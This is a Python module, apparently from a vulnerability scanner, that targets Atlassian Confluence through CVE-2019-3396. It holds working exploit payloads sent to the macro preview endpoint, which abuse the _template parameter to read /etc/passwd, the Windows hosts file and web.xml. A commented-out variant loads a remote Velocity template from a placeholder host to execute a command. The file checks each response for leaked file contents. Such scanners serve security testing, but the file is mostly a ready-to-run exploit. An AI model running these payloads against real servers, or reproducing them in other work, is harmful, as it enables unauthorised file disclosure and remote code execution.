#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2019_3396_payloads = [
    # { # * 用于命令执行, 需要将payload保存至.vm文件中, 然后加载远程文件
    #     'path': 'rest/tinymce/1/macro/preview',
    #     'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.example.com/v/123456", "width": "1000"," height": "1000","_template":"https://www.example.com/confluence.vm","command":' + cmd + '}}}',
    #     'headers': {'Content-Type': 'application/json; charset=utf-8'}
    # },
    {
        'path': 'rest/tinymce/1/macro/preview',
        'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"file:///etc/passwd"}}}',
    },
    {
        'path': 'rest/tinymce/1/macro/preview',
        'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"file:///C:\Windows\System32\drivers\etc\hosts"}}}',
    },
    {
        'path': 'rest/tinymce/1/macro/preview',
        'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"file:///C:/Windows/System32/drivers/etc/hosts"}}}',
    },
    {
        'path': 'rest/tinymce/1/macro/preview',
        'data': '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":"../web.xml"}}}',
    }
]

def cve_2019_3396_scan(clients):
    ''' Atlassian Confluence 6.14.2 版本之前存在未经授权的目录遍历漏洞, 
        攻击者可以使用 Velocity 模板注入读取任意文件或执行任意命令
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'AtlassianConfluence',
        # 'vul_type' = 'FileRead/RCE',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2019-3396',
    }

    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Referer': client.protocol_domain
    }

    for payload in cve_2019_3396_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

            # (check.check_res(res.text, self.md))
        if (check.check_res_fileread(res.text)
            or (('<?xml version="1.0" encoding="UTF-8"?>' in res.text) 
                and ('Confluence' in res.text))
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
